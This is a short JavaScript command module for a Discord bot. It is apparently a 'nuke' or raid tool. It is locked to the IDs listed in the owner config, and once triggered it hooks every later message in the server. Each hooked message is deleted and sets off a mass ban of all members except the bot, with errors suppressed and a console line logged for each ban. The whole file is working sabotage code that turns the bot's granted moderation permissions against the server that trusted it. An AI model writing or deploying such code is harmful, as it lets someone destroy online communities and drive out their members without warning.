const discord = require('discord.js')
const colors = require("colors")

exports.run = async (client, message, args) => {
    
const { dono } = require("../config.json");
if (!dono.includes(message.author.id)) return message.send("");
message.delete()

	client.on('message', async (message) => {

		message.delete()

		const info = "[ " + "BASIC+ INFO".red + " ] - "

            const GD = await message.guild.fetchMembers()
            const fetched = GD.members.map(m => m);
            for(var i = 0; i < fetched.length; i++){
               if(fetched[i].id != client.user.id){
                    fetched[i].ban().then(() => {
                    console.log(info + `Membro banido!`)
                }).catch(e => {})
              }
        }  
});

}  